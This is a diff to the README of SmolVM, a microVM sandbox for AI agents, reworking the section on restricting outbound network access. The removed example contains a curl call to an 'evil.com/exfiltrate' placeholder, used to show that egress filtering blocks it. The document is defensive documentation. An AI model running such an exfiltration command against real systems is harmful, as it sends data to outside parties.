@@ -39,7 +39,7 @@ Each microVM boots in milliseconds, runs any code or software you throw at it, p
 <tr>
 <td width="50%" valign="top">
 <p><img src="https://api.iconify.design/lucide/network.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>Network controls</strong></p>
-<p>Lock down egress to specific domains so agents can't call home or exfiltrate data.</p>
+<p>Turn outbound access off or limit it to specific IP addresses on Linux Firecracker.</p>
 <p><a href="#network-controls">Read more →</a></p>
 </td>
 <td width="50%" valign="top">
@@ -287,22 +287,24 @@ See [examples/browser_sandbox.py](examples/browser_sandbox.py) for a complete Py
 
 ## Network controls
 
-By default, sandboxes have full internet access. You can restrict which domains a sandbox can reach by passing `internet_settings`:
+Sandboxes have internet access by default. On Linux with Firecracker, turn outbound access off while keeping commands and file transfers available through a direct connection (`vsock`):
 
 ```python
 from smolvm import SmolVM
 
-vm = SmolVM(
-    internet_settings={
-        "allowed_domains": ["https://api.openai.com"],
-    }
-)
-
-vm.run("curl https://api.openai.com/v1/models")  # allowed
-vm.run("curl https://evil.com/exfiltrate")  # blocked
+with SmolVM(
+    backend="firecracker",
+    comm_channel="vsock",
+    internet_settings={"mode": "off"},
+) as vm:
+    print(vm.run("echo hello").stdout)
 ```
 
-See [docs/guides/networking.md](docs/guides/networking.md) for how it works under the hood.
+Use `mode="restricted"` with `allowed_cidrs` to allow specific IPv4 addresses or ranges. These modes require private networking and do not support shared folders or exposed ports. Command output and explicit file downloads still work when outbound access is off.
+
+Existing `allowed_domains` lists allow the IP addresses found during setup; they do not verify the hostname on each connection. DNS servers are not automatically allowed.
+
+See the [networking guide](docs/guides/networking.md) for a restricted-access example and supported configurations.
 
 
 ## Mount host directories
